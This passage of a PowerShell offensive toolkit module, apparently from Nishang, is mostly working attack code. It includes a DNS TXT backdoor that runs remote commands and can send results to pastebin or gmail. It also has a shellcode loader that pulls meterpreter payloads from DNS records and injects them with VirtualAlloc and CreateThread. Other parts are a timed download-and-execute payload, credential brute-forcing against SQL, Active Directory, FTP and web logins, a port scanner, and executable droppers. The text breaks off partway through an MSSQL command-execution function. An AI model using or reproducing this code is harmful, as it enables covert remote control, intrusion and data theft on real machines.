        if (($vpc -eq "vmwareuser.exe") -or ($vpc -match "vmwaretray.exe"))
            {
                $vpcvm = $true
            }
    }

if (!$vpcvm)
    {
        $vpc = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
        if (($vpc -match "vpc-s3") -or ($vpc -match "vpcuhub") -or ($vpc -match "msvmmouf"))
            {
                $vpcvm = $true
            }
    }

if ($vpcvm)
    {
    
    "This is a Virtual PC."
    
    }


#Virtual Box

$vb = Get-Process
if (($vb -eq "vboxservice.exe") -or ($vb -match "vboxtray.exe"))
    {
    
    $vbvm = $true
    
    }
if (!$vbvm)
    {
        $vb = Get-ChildItem HKLM:\HARDWARE\ACPI\FADT
        if ($vb -match "vbox_")
            {
                $vbvm = $true
            }
    }

if (!$vbvm)
    {
        $vb = Get-ChildItem HKLM:\HARDWARE\ACPI\RSDT
        if ($vb -match "vbox_")
            {
                $vbvm = $true
            }
    }

    
if (!$vbvm)
    {
        $vb = Get-Childitem hklm:\hardware\devicemap\scsi -recurse | gp -Name identifier
        if ($vb -match "vbox")
            {
                $vbvm = $true
            }
    }



if (!$vbvm)
    {
        $vb = Get-ItemProperty hklm:\HARDWARE\DESCRIPTION\System -Name SystemBiosVersion
        if ($vb -match "vbox")
            {
                 $vbvm = $true
            }
    }
  

if (!$vbvm)
    {
        $vb = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
        if (($vb -match "VBoxMouse") -or ($vb -match "VBoxGuest") -or ($vb -match "VBoxService") -or ($vb -match "VBoxSF"))
            {
                $vbvm = $true
            }
    }

if ($vbvm)
    {
    
    "This is a Virtual Box."
    
    }



#Xen

$xen = Get-Process

if ($xen -eq "xenservice.exe")
    {
    
    $xenvm = $true
    
    }
    
if (!$xenvm)
    {
        $xen = Get-ChildItem HKLM:\HARDWARE\ACPI\FADT
        if ($xen -match "xen")
            {
                $xenvm = $true
            }
    }

if (!$xenvm)
    {
        $xen = Get-ChildItem HKLM:\HARDWARE\ACPI\DSDT
        if ($xen -match "xen")
            {
                $xenvm = $true
            }
    }
    
if (!$xenvm)
    {
        $xen = Get-ChildItem HKLM:\HARDWARE\ACPI\RSDT
        if ($xen -match "xen")
            {
                $xenvm = $true
            }
    }

    
if (!$xenvm)
    {
       $xen = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
        if (($xen -match "xenevtchn") -or ($xen -match "xennet") -or ($xen -match "xennet6") -or ($xen -match "xensvc") -or ($xen -match "xenvdb"))
            {
                $xenvm = $true
            }
    }


if ($xenvm)
    {
    
    "This is a Xen Machine."
    
    }


#QEMU

$qemu = Get-Childitem hklm:\hardware\devicemap\scsi -recurse | gp -Name identifier
if ($qemu -match "qemu")
    {
    
        $qemuvm = $true
    
    }
    
if (!$qemuvm)
    {
    $qemu = Get-ItemProperty hklm:HARDWARE\DESCRIPTION\System\CentralProcessor\0 -Name ProcessorNameString
    if ($qemu -match "qemu")
        {
            $qemuvm = $true
        }
    }    

if ($qemuvm)
    {
    
    "This is a Qemu machine."
    
    }
else
    {
    "No Virtual Machine detected."
    }
    
}


#####################Acts as a backdoor and is capable of recieving commands and PowerShell scripts from DNS TXT queries.#####################
function DNS_TXT_Pwnage
{

<#
.SYNOPSIS
Payload which acts as a backdoor and is capable of recieving commands and PowerShell scripts from DNS TXT queries.

.DESCRIPTION
This payload continuously queries a subdomain's TXT records. It could be
sent commands and powershell scripts to be executed on the target machine by
TXT messages of a domain.

.PARAMETER startdomain
The domain (or subdomain) whose TXT records would be checked regularly for further instructions.

.PARAMETER cmdstring
 The string, if responded by TXT record of startdomain, will make the payload  query "commanddomain" for commands.
 
.PARAMETER commanddomain
The domain (or subdomain) whose TXT records would be used to issue commands to the payload.

.PARAMETER psstring
 The string, if responded by TXT record of startdomain, will make the payload  query "psdomain" for base64 encoded powershell script. 

.PARAMETER psdomain
The domain (or subdomain) which would be used to provide powershell scripts from its TXT records. 

.PARAMETER stopstring
The string, if responded by TXT record of startdomain, will stop this payload on the target.

.PARAMETER AUTHNS
Authoritative Name Server for the domains (or startdomain in case you are using separate domains). Startdomain 
would be changed for commands and an authoritative reply shoudl reflect changes immediately.

.PARAMETER exfil
Use this parameter to use exfiltration methods to return results of the backdoor.

.PARAMETER dev_key
The Unique API key provided by pastebin when you register a free account.
Unused for tinypaste.
Unused for gmail option.

.PARAMETER username
Username for the pastebin account where keys would be pasted.
Username for the tinypaste account where keys would be pasted.
Username for the gmail account where attachment would be sent as an attachment.

.PARAMETER password
Password for the pastebin account where keys would be pasted.
Password for the tinypaste account where keys would be pasted.
Password for the gmail account where keys would be sent.

.PARAMETER keyoutoption
The method you want to use for exfitration of data.
"0" for displaying on console
"1" for pastebin.
"2" for gmail
"3" for tinypaste   

.EXAMPLE
PS > DNS_TXT_Pwnage
The payload will ask for all required options.

.EXAMPLE
PS > DNS_TXT_Pwnage start.alteredsecurity.com begincommands command.alteredsecurity.com startscript enscript.alteredsecurity.com stop ns8.zoneedit.com
In the above example if you want to execute commands. TXT record of start.alteredsecurity.com must contain only "begincommands" and command.alteredsecurity.com should conatin a single command 
you want to execute. The TXT record could be changed live and the payload will pick up updated record to execute new command.

To execute a script in above example, start.alteredsecurity.com must contain "startscript". As soon it matches, the payload will query 
psdomain looking for a base64encoded powershell script. Use the StringToBase64 function to encode scripts to base64.

.EXAMPLE
PS > DNS_TXT_Pwnage start.alteredsecurity.com begincommands command.alteredsecurity.com startscript enscript.alteredsecurity.com stop ns8.zoneedit.com -exfil  <devkey> <username> <password> <keyoutoption>
Use above command for using exfiltration methods.

.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang
#>


    [CmdletBinding(DefaultParameterSetName="noexfil")]
    Param( [Parameter(Parametersetname="exfil")] [Switch] $exfil,
    [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")] [String]$startdomain,
    [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")] [String]$cmdstring,
    [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 2, Mandatory = $True, Parametersetname="noexfil")] [String]$commanddomain,
    [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 3, Mandatory = $True, Parametersetname="noexfil")] [String]$psstring,
    [Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 4, Mandatory = $True, Parametersetname="noexfil")] [String]$psdomain,
    [Parameter(Position = 5, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 5, Mandatory = $True, Parametersetname="noexfil")] [String]$StopString,
    [Parameter(Position = 6, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 6, Mandatory = $True, Parametersetname="noexfil")] [String]$AuthNS,    
    [Parameter(Position = 7, Mandatory = $True, Parametersetname="exfil")] [String]$dev_key,
    [Parameter(Position = 8, Mandatory = $True, Parametersetname="exfil")] [String]$username,
    [Parameter(Position = 9, Mandatory = $True, Parametersetname="exfil")] [String]$password,
    [Parameter(Position = 10, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )

    $modulepath = Split-Path $script:MyInvocation.MyCommand.Path
    $modulename = $script:MyInvocation.MyCommand.Name
    $name = "$modulepath\$modulename"
    
    if ($exfil -eq $True)
    {
        $Argumentlist = StringtoBase64 -IsString "Import-Module $name;Logic-DNS_TXT_Pwnage $Startdomain $cmdstring $commanddomain $psstring $psdomain $Stopstring $AuthNS $dev_key $username $password $keyoutoption $exfil"
        Start-Process powershell.exe -ArgumentList "-encodedcommand $Argumentlist"
    }
    else
    {
        $Argumentlist = StringtoBase64 -IsString "Import-Module $name;Logic-DNS_TXT_Pwnage $Startdomain $cmdstring $commanddomain $psstring $psdomain $Stopstring $AuthNS"
        Start-Process powershell.exe -ArgumentList "-encodedcommand $Argumentlist"
    }
 }


###########################################################Logic for DNS_TXT_Pwnage backdoor######################################################
 function Logic-DNS_TXT_Pwnage ($Startdomain, $cmdstring, $commanddomain, $psstring, $psdomain, $Stopstring, $AuthNS, $dev_key, $username, $password, $keyoutoption, $exfil)
 {  

    while($true)
    {
        $exec = 0
        start-sleep -seconds 5
        $getcode = (Invoke-Expression "nslookup -querytype=txt $startdomain $AuthNS") 
        $tmp = $getcode | select-string -pattern "`""
        $startcode = $tmp -split("`"")[0]
        if ($startcode[1] -eq $cmdstring)
        {
            start-sleep -seconds 5
            $getcommand = (Invoke-Expression "nslookup -querytype=txt $commanddomain $AuthNS") 
            $temp = $getcommand | select-string -pattern "`""
            $command = $temp -split("`"")[0]
            $pastevalue = Invoke-Expression $command[1]
            $pastevalue
            $exec++
            if ($exfil -eq $True)
            {
                $pastename = $env:COMPUTERNAME + " Results of DNS TXT Pwnage: "
                Do-Exfiltration "$pastename" "$pastevalue" "$username" "$password" "$dev_key" "$keyoutoption"
            }
            if ($exec -eq 1)
            {
                Start-Sleep -Seconds 60
            }
        }

        if ($startcode[1] -match $psstring)
        {
                      
            $getcommand = (Invoke-Expression "nslookup -querytype=txt $psdomain $AuthNS") 
            $temp = $getcommand | select-string -pattern "`""
            $tmp1 = ""
            foreach ($txt in $temp)
            {
                $tmp1 = $tmp1 + $txt
            }
            $command = $tmp1 -replace '\s+', "" -replace "`"", ""
            $pastevalue = powershell.exe -encodedcommand $command
            $pastevalue
            #Problem with using stringtobase64 to encode a file. After decoding it creates spaces in between the script.
            #A temporary workaround is using a semicolon ";" separated script in one line.
            $exec++
            if ($exfil -eq $True)
            {
                $pastename = $env:COMPUTERNAME + " Results of DNS TXT Pwnage: "
                Do-Exfiltration "$pastename" "$pastevalue" "$username" "$password" "$dev_key" "$keyoutoption"
            }
            if ($exec -eq 1)
            {
                Start-Sleep -Seconds 60
            }

        }
        
        if($startcode[1] -eq $StopString)
        {
            break
        }
    }
}



function Execute-DNSTXT-Code
{


<#
.SYNOPSIS
Payload which could execute shellcode from DNS TXT queries.

.DESCRIPTION
This payload is able to pull shellcode from txt record of a domain. It has been tested for 
first stage of meterpreter shellcode generated using msf.
Below commands could be used to generate shellcode to be usable with this payload
./msfpayload windows/meterpreter/reverse_tcp LHOST= EXITFUNC=process C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- |sed 's/^[^0]*\(0.*\/\*\).*/\1/' | sed 's/.\{2\}$//' | tr -d '\n'
./msfpayload windows/x64/meterpreter/reverse_tcp LHOST= EXITFUNC=process C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- |sed 's/^[^0]*\(0.*\/\*\).*/\1/' | sed 's/.\{2\}$//' | tr -d '\n'

.PARAMETER shellcode32
The domain (or subdomain) whose TXT records would hold 32-bit shellcode.

.PARAMETER shellcode64
The domain (or subdomain) whose TXT records would hold 64-bit shellcode.

.PARAMETER AuthNS
Authoritative Name Server for the domains.


.EXAMPLE
PS > Execute-DNSTXT-Code
The payload will ask for all required options.

.EXAMPLE
PS > Execute-DNSTXT-Code 32.alteredsecurity.com 64.alteredsecurity.com ns8.zoneedit.com
Use above from non-interactive shell.

.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang

.NOTES
The code execution logic is based on this post by Matt.
http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html
#>
    
    
Param( [Parameter(Position = 0, Mandatory = $True)] [String]$shellcode32,
[Parameter(Position = 1, Mandatory = $True)] [String]$shellcode64,
[Parameter(Position = 2, Mandatory = $True)] [String]$AuthNS)

$modulepath = Split-Path $script:MyInvocation.MyCommand.Path
$modulename = $script:MyInvocation.MyCommand.Name
$name = "$modulepath\$modulename"
$Argumentlist = StringtoBase64 -IsString "Import-Module $name;Logic-Execute-DNSTXT-Code $shellcode32 $shellcode64 $AuthNS"
Start-Process -WindowStyle Hidden powershell.exe -ArgumentList "-encodedcommand $Argumentlist"

}

function Logic-Execute-DNSTXT-Code($shellcode32, $shellcode64, $AuthNS)
{
    $code = (Invoke-Expression "nslookup -querytype=txt $shellcode32 $AuthNS")  
    $tmp = $code | select-string -pattern "`"" 
    $tmp1 = $tmp -split("`"")[0] 
    [string]$shell = $tmp1 -replace "`t", "" 
    $shell = $shell.replace(" ", "") 
    [Byte[]]$sc32 = $shell -split ',' 
    $code64 = (Invoke-Expression "nslookup -querytype=txt $shellcode64 $AuthNS")  
    $tmp64 = $code64 | select-string -pattern "`"" 
    $tmp164 = $tmp64 -split("`"")[0] 
    [string]$shell64 = $tmp164 -replace "`t", "" 
    $shell64 = $shell64.replace(" ", "") 
    [Byte[]]$sc64 = $shell64 -split ',' 
    $code = @' 
    [DllImport("kernel32.dll")] 
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); 
    [DllImport("kernel32.dll")] 
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); 
    [DllImport("msvcrt.dll")] 
    public static extern IntPtr memset(IntPtr dest, uint src, uint count); 
'@ 
    $winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru 
    [Byte[]]$sc = $sc32 
    if ([IntPtr]::Size -eq 8) {$sc = $sc64} 
    $size = 0x1000 
    if ($sc.Length -gt 0x1000) {$size = $sc.Length} 
    $x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40) 
    for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)} 
    $winFunc::CreateThread(0,0,$x,0,0,0) 
    while(1)
    {
        start-sleep -Seconds 100
    }
}

###############################################convert an executable to text file.#######################################################
function ExetoText
{
<#
.SYNOPSIS
Payload to convert an executable to text file.

.DESCRIPTION
This payload converts and an executable to a text file.

.PARAMETER EXE
The executable to be converted.

.PARAMETER FileName
Name of the text file to which executable will be converted.

.EXAMPLE
PS > ExetoText evil.exe evil.txt

.LINK
http://www.exploit-monday.com/2011/09/dropping-executables-with-powershell.html
http://code.google.com/p/nishang
#>
    Param ( [Parameter(Position = 0, Mandatory = $True)] [String] $EXE, [Parameter(Position = 1, Mandatory = $True)] [String]$Filename)
    [byte[]] $hexdump = get-content -encoding byte -path "$EXE"
    [System.IO.File]::WriteAllLines("$Filename", ([string]$hexdump))
}



################################Performs a Brute-Force Attack against SQL Server, Active Directory, Web and FTP.###########################
####Thanks Niklas Goude#####
###http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/03/use-powershell-to-security-test-sql-server-and-sharepoint.aspx
function Brute-Force {

<#
.SYNOPSIS
Payload which performs a Brute-Force Attack against SQL Server, Active Directory, Web and FTP.

.DESCRIPTION
This payload tries to login to SQL, ActiveDirectory, Web or FTP using a specific account and password.
You can also specify a password-list as input as shown in the Example section.

.PARAMETER Identity
Specifies a SQL Server, FTP Site or Web Site.

.PARAMETER UserName
Specifies a UserName. If blank, trusted connection will be used for SQL and anonymous access will be used for FTP.

.PARAMETER Password
Specifies a Password.

.PARAMETER Service
Enter a Service. Default service is set to SQL.

.EXAMPLE
PS> Brute-Force -Identity SRV01 -UserName sa -Password ""

.EXAMPLE
PS> Brute-Force -Identity ftp://SRV01 -UserName sa -Password "" -Service FTP

.EXAMPLE
PS> "SRV01","SRV02","SRV03" | Brute-Force -UserName sa -Password sa

.EXAMPLE
PS> Brute-Force -Identity "domain.local" -UserName administrator -Password Password1 -Service ActiveDirectory

.EXAMPLE
PS> Brute-Force -Identity "http://www.something.com" -UserName user001 -Password Password1 -Service Web

.LINK
http://www.truesec.com
http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/03/use-powershell-to-security-test-sql-server-and-sharepoint.aspx
http://code.google.com/p/nishang

.NOTES
Goude 2012, TreuSec
#>

  Param(
    [Parameter(Mandatory = $true,
      Position = 0,
      ValueFromPipeLineByPropertyName = $true)]
    [Alias("PSComputerName","CN","MachineName","IP","IPAddress","ComputerName","Url","Ftp","Domain","DistinguishedName")]
    [string]$Identity,

    [parameter(Position = 1,
      ValueFromPipeLineByPropertyName = $true)]
    [string]$UserName,

    [parameter(Position = 2,
      ValueFromPipeLineByPropertyName = $true)]
    [string]$Password,

    [parameter(Position = 3)]
    [ValidateSet("SQL","FTP","ActiveDirectory","Web")]
    [string]$Service = "SQL"
  )
  
  Process {
    if($service -eq "SQL") {
      $Connection = New-Object System.Data.SQLClient.SQLConnection
      if($userName) {
        $Connection.ConnectionString = "Data Source=$identity;Initial Catalog=Master;User Id=$userName;Password=$password;"
      } else {
        $Connection.ConnectionString = "server=$identity;Initial Catalog=Master;trusted_connection=true;"
      }
      Try {
        $Connection.Open()
        $success = $true
      }
      Catch {
        $success = $false
      }
      if($success -eq $true) {
        $message = switch($connection.ServerVersion) {
          { $_ -match "^6" } { "SQL Server 6.5";Break }
          { $_ -match "^6" } { "SQL Server 7";Break }
          { $_ -match "^8" } { "SQL Server 2000";Break }
          { $_ -match "^9" } { "SQL Server 2005";Break }
          { $_ -match "^10\.00" } { "SQL Server 2008";Break }
          { $_ -match "^10\.50" } { "SQL Server 2008 R2";Break }
          Default { "Unknown" }
        }
      } else {
        $message = "Unknown"
      }
    } elseif($service -eq "FTP") {
      if($identity -notMatch "^ftp://") {
        $source = "ftp://" + $identity
      } else {
        $source = $identity
      }
      try {
        $ftpRequest = [System.Net.FtpWebRequest]::Create($source)
        $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectoryDetails
        $ftpRequest.Credentials = new-object System.Net.NetworkCredential($userName, $password)
        $result = $ftpRequest.GetResponse()
        $message = $result.BannerMessage + $result.WelcomeMessage
        $success = $true
      } catch {
        $message = $error[0].ToString()
        $success = $false
      }
    } elseif($service -eq "ActiveDirectory") {
      Add-Type -AssemblyName System.DirectoryServices.AccountManagement
      $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
      Try {
        $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($contextType, $identity)
        $success = $true
      }
      Catch {
        $message = "Unable to contact Domain"
        $success = $false
      }
      if($success -ne $false) {
        Try {
          $success = $principalContext.ValidateCredentials($username, $password)
          $message = "Password Match"
        }
        Catch {
          $success = $false
          $message = "Password doesn't match"
        }
      }
    } elseif($service -eq "Web") {
      if($identity -notMatch "^(http|https)://") {
        $source = "http://" + $identity
      } else {
        $source = $identity
      }
      $webClient = New-Object Net.WebClient
      $securePassword = ConvertTo-SecureString -AsPlainText -String $password -Force
      $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $userName, $securePassword
      $webClient.Credentials = $credential
      Try {
        $message = $webClient.DownloadString($source)
        $success = $true
      }
      Catch {
        $success = $false
        $message = "Password doesn't match"
      }
    }
    # Return Object
    New-Object PSObject -Property @{
      ComputerName = $identity;
      UserName = $username;
      Password = $Password;
      Success = $success;
      Message = $message
    } | Select-Object Success, Message, UserName, Password, ComputerName
  }
}


#########################################Scan IP-Addresses, Ports and HostNames############################################################
####Thanks Niklas Goude#####
function Port-Scan {

<#
.SYNOPSIS
Nihsang payload which Scan IP-Addresses, Ports and HostNames

.DESCRIPTION
Scan for IP-Addresses, HostNames and open Ports in your Network.
    
.PARAMETER StartAddress
StartAddress Range

.PARAMETER EndAddress
EndAddress Range

.PARAMETER ResolveHost
Resolve HostName

.PARAMETER ScanPort
Perform a PortScan

.PARAMETER Ports
Ports That should be scanned, default values are: 21,22,23,53,69,71,80,98,110,139,111,
389,443,445,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,
5801,5900,5555,5901

.PARAMETER TimeOut
Time (in MilliSeconds) before TimeOut, Default set to 100

.EXAMPLE
Port-Scan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254

.EXAMPLE
Port-Scan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost

.EXAMPLE
Port-Scan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort

.EXAMPLE
Port-Scan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort -TimeOut 500

.EXAMPLE
Port-Scan -StartAddress 192.168.0.1 -EndAddress 192.168.10.254 -ResolveHost -ScanPort -Port 80

.LINK
http://www.truesec.com
http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/02/use-powershell-for-network-host-and-port-discovery-sweeps.aspx
http://code.google.com/p/nishang
    
.NOTES
Goude 2012, TrueSec
#>


Param(
    [parameter(Mandatory = $true,
      Position = 0)]
    [ValidatePattern("\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")]
    [string]$StartAddress,
    [parameter(Mandatory = $true,
      Position = 1)]
    [ValidatePattern("\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")]
    [string]$EndAddress,
    [switch]$ResolveHost,
    [switch]$ScanPort,
    [int[]]$Ports = @(21,22,23,53,69,71,80,98,110,139,111,389,443,445,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901),
    [int]$TimeOut = 100
  )
  
  Begin {
    $ping = New-Object System.Net.Networkinformation.Ping
  }
  Process {
    foreach($a in ($StartAddress.Split(".")[0]..$EndAddress.Split(".")[0])) {
      foreach($b in ($StartAddress.Split(".")[1]..$EndAddress.Split(".")[1])) {
        foreach($c in ($StartAddress.Split(".")[2]..$EndAddress.Split(".")[2])) {
          foreach($d in ($StartAddress.Split(".")[3]..$EndAddress.Split(".")[3])) {
            write-progress -activity PingSweep -status "$a.$b.$c.$d" -percentcomplete (($d/($EndAddress.Split(".")[3])) * 100)
            $pingStatus = $ping.Send("$a.$b.$c.$d",$TimeOut)
            if($pingStatus.Status -eq "Success") {
              if($ResolveHost) {
                write-progress -activity ResolveHost -status "$a.$b.$c.$d" -percentcomplete (($d/($EndAddress.Split(".")[3])) * 100) -Id 1
                $getHostEntry = [Net.DNS]::BeginGetHostEntry($pingStatus.Address, $null, $null)
              }
              if($ScanPort) {
                $openPorts = @()
                for($i = 1; $i -le $ports.Count;$i++) {
                  $port = $Ports[($i-1)]
                  write-progress -activity PortScan -status "$a.$b.$c.$d" -percentcomplete (($i/($Ports.Count)) * 100) -Id 2
                  $client = New-Object System.Net.Sockets.TcpClient
                  $beginConnect = $client.BeginConnect($pingStatus.Address,$port,$null,$null)
                  if($client.Connected) {
                    $openPorts += $port
                  } else {
                    # Wait
                    Start-Sleep -Milli $TimeOut
                    if($client.Connected) {
                      $openPorts += $port
                    }
                  }
                  $client.Close()
                }
              }
              if($ResolveHost) {
                $hostName = ([Net.DNS]::EndGetHostEntry([IAsyncResult]$getHostEntry)).HostName
              }
              # Return Object
              New-Object PSObject -Property @{
                IPAddress = "$a.$b.$c.$d";
                HostName = $hostName;
                Ports = $openPorts
              } | Select-Object IPAddress, HostName, Ports
            }
          }
        }
      }
    }
  }
  End {
  }
}

############################################################Convert a plain string to Base64 encoding.####################################
function StringtoBase64
{


<#
.SYNOPSIS
Helper function which encodes a string to base64 string.

.DESCRIPTION
This payload encodes the given string to base64 string.

.PARAMETER Str
The string to be encoded

.EXAMPLE
PS > StringToBase64 "start-process calc.exe"

.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang
#>

Param( [Parameter(Position = 0, Mandatory = $True)] [String] $Str, [Switch] $IsString)
if($IsString -eq $true)
    {
    
        $utfbytes  = [System.Text.Encoding]::Unicode.GetBytes($Str)
       
    }
  else
    {
        $utfbytes  = [System.Text.Encoding]::Unicode.GetBytes((Get-Content $Str))
    }

  $base64string = [System.Convert]::ToBase64String($utfbytes)
  $base64string
}


####################################Convert an executable file in hex format to executable (.exe)########################################

function TexttoEXE
{

<#
.SYNOPSIS
Payload to convert a PE file in hex format to executable

.DESCRIPTION
This payload converts a PE file in hex to executable.

.PARAMETER Filename
Name of the hex text file from which  executable will be created.

.PARAMETER EXE
Name of the created executable

.EXAMPLE
PS > TexttoExe evil.text evil.exe

.LINK
http://www.exploit-monday.com/2011/09/dropping-executables-with-powershell.html
http://code.google.com/p/nishang
#>

    Param ( [Parameter(Position = 0, Mandatory = $True)] [String] $Filename, [Parameter(Position = 1, Mandatory = $True)] [String]$EXE)
    [string]$hexdump = get-content -path "$Filename"
    [Byte[]] $temp = $hexdump -split ' '
    [System.IO.File]::WriteAllBytes("$EXE", $temp)
}



#############################################Waits till given time to execute a script.####################################################
function Execute-OnTime
{

<#
.SYNOPSIS
Payload which waits till given time to execute a script.

.DESCRIPTION
This payload waits till the given time (on the victim) and then downloads a PowerShell script and executes it.

.PARAMETER URL
The URL from where the file would be downloaded.

.PARAMETER time
The Time when the payload will be executed (in 24 hour format e.g. 23:21).

.PARAMETER CheckURL
The URL which the payload would check for instructions to stop.

.PARAMETER StopString
The string which if found at CheckURL will stop the payload.

PARAMETER exfil
Use this parameter to use exfiltration methods for returning the results.

.PARAMETER dev_key
The Unique API key provided by pastebin when you register a free account.
Unused for tinypaste.
Unused for gmail option.

.PARAMETER username
Username for the pastebin account where data would be pasted.
Username for the tinypaste account where data would be pasted.
Username for the gmail account where attachment would be sent as an attachment.

.PARAMETER password
Password for the pastebin account where data would be pasted.
Password for the tinypaste account where data would be pasted.
Password for the gmail account where data would be sent.

.PARAMETER keyoutoption
The method you want to use for exfitration of data.
"0" for displaying on console
"1" for pastebin.
"2" for gmail
"3" for tinypaste   

.EXAMPLE
PS > Execute-OnTime http://example.com/script.ps1 hh:mm http://pastebin.com/raw.php?i=Zhyf8rwh stoppayload

EXAMPLE
PS > Execute-OnTime http://pastebin.com/raw.php?i=Zhyf8rwh hh:mm http://pastebin.com/raw.php?i=jqP2vJ3x stoppayload -exfil <devkey> <username> <password> <keyoutoption>

Use above when using the payload from non-interactive shells.

.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang
#>



    [CmdletBinding(DefaultParameterSetName="noexfil")]
    Param( [Parameter(Parametersetname="exfil")] [Switch] $exfil,
    [Parameter(Position = 0, Parametersetname="exfil")] [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")] [String] $URL,
    [Parameter(Position = 1, Parametersetname="exfil")] [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")] [String]$time,
    [Parameter(Position = 2, Parametersetname="exfil")] [Parameter(Position = 2, Mandatory = $True, Parametersetname="noexfil")] [String]$CheckURL,
    [Parameter(Position = 3, Parametersetname="exfil")] [Parameter(Position = 3, Mandatory = $True, Parametersetname="noexfil")] [String]$StopString,
    [Parameter(Position = 4,Mandatory = $True, Parametersetname="exfil")] [String]$dev_key,
    [Parameter(Position = 5,Mandatory = $True, Parametersetname="exfil")] [String]$username,
    [Parameter(Position = 6,Mandatory = $True, Parametersetname="exfil")] [String]$password,
    [Parameter(Position = 7,Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )

    $modulepath = Split-Path $script:MyInvocation.MyCommand.Path
    $modulename = $script:MyInvocation.MyCommand.Name
    $name = "$modulepath\$modulename"
    
    if ($exfil -eq $True)
    {
        $Argumentlist = StringtoBase64 -IsString "Import-Module $name;Logic-Execute-OnTime $URL $time $CheckURL $StopString $dev_key $username $password $keyoutoption $exfil"
        Start-Process -WindowStyle Hidden powershell.exe -ArgumentList "-encodedcommand $Argumentlist"
    }
    else
    {
        $Argumentlist = StringtoBase64 -IsString "Import-Module $name;Logic-Execute-OnTime $URL $time $CheckURL $StopString"
        Start-Process -WindowStyle Hidden powershell.exe -ArgumentList "-encodedcommand $Argumentlist"
    }
}

function Logic-Execute-OnTime ($URL, $time, $CheckURL, $StopString, $dev_key, $username, $password, $keyoutoption, $exfil)
{
    $exec = 0
    while($true)
    {
    start-sleep -seconds 5 
    $webclient = New-Object System.Net.WebClient
    $filecontent = $webclient.DownloadString("$CheckURL")
    $systime = Get-Date -UFormat %R
    if ($systime -match $time)
    {
        $pastevalue = Invoke-Expression $webclient.DownloadString($URL)
        $pastevalue
        $exec++
        if ($exfil -eq $True)
        {
            $pastename = $env:COMPUTERNAME + "Results of Time Execution: "
            Do-Exfiltration "$pastename" "$pastevalue" "$username" "$password" "$dev_key" "$keyoutoption"
        }
        if ($exec -eq 1)
        {
            Start-Sleep -Seconds 60
        }
    }
    elseif ($filecontent -eq $StopString)
    {
        break
    }
    }
}



####################################################Execute commands remotely on a MS SQL server.##############################################
function Execute-Command-MSSQL
{

<#
.SYNOPSIS
Payload which could be used to execute commands remotely on a MS SQL server.

.DESCRIPTION
This payload needs a valid administrator username and password on remote SQL server.
It uses the credentials to enable xp_cmdshell and provides a powershell shell, a sql shell
or a cmd shell on the target.

.PARAMETER ComputerName
Enter CopmuterName or IP Address of the target SQL server.

.PARAMETER UserName
Enter a UserName for a SQL server administrator account.

.PARAMETER Password
Enter the Password for the account.

.EXAMPLE
Execute-Command-MSSQL -ComputerName sqlserv01 -UserName sa -Password sa1234

.EXAMPLE
Execute-Command-MSSQL -ComputerName 192.168.1.10 -UserName sa -Password sa1234

.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang

.NOTES
Based mostly on the Get-TSSqlSysLogin by Niklas Goude and accompanying blog post at 
http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/03/use-powershell-to-security-test-sql-server-and-sharepoint.aspx
http://www.truesec.com

#>

Param(
    [Parameter(Mandatory = $true, Position = 0, ValueFromPipeLine= $true)]
    [Alias("PSComputerName","CN","MachineName","IP","IPAddress")][string]$ComputerName,
    [parameter(Mandatory = $true, Position = 1)][string]$UserName,
    [parameter(Mandatory = $true, Position = 2)][string]$Password
    )
Try{
    function Make-Connection ($query){
 
    $Connection = New-Object System.Data.SQLClient.SQLConnection
